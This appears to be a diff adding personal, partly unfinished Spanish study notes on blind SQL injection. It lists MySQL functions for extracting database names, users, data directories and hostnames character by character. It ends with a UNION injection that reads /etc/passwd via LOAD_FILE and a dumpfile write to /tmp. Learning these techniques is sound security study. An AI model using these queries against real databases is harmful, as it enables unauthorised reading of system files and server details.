@@ -1,0 +1,86 @@
+Introducción a la inyección SQL
+
+
+
+Blin SQLi
+
+	* indentificar en la página un elemento númerico que tenga referencia con la página y que al cambiarlo cambie
+	
+	* aplicar lógica n
+
+
+
+
+
+	query:
+
+	   * obtener un caracteres de un string, parametros 'string', 'posición del caracter', 'cantidad de elementos
+
+		SELECT substring('abcd’, 3, 1); 	--> returns c		
+
+		SELECT substring('abcd’, 3, 2); 	--> returns cd
+		
+		or
+
+		SELECT substr(‘abcd’, 3, 1); 		--> returns c		
+
+		SELECT substr(‘abcd’, 3, 2); 		--> returns cd		
+
+
+	   * obtener valor ASCII de un caracter
+
+		SELECT ascii('a');	--> returns 97
+
+
+	   * obtener caracter desde un valor ASCII
+
+		SELECT char(97);		--> returns a
+
+
+	   * consultar versión de la database
+
+		SELECT @@version
+
+         * consulta el nombre de la database actual
+
+		SELECT database();
+
+
+	   * consultar el primer caracter del nombre de la database actual
+
+		SELECT SUBSTRING(database(),1,1);	
+
+
+	   * consultar el primer caracter del nombre de la database actual en formato ASCII
+		
+		SELECT ascii(SUBSTRING(database(),1,1));
+
+
+	   * consultar el usuario actual de la database
+
+		SELECT user();
+
+		or
+
+		SELECT system_user();
+
+
+	   * ubicación de la database
+			
+		SELECT @@datadir;
+
+
+	   * hostname e ip address
+		
+		SELECT @@hostname;
+
+
+	   * local file access
+
+		'UNION ALL SELECT LOAD_FILE('/etc/passwd')
+
+		or
+
+		SELECT * FROM mytable INTO dumpfile '/tmp/nombre_archivo'
+
+	
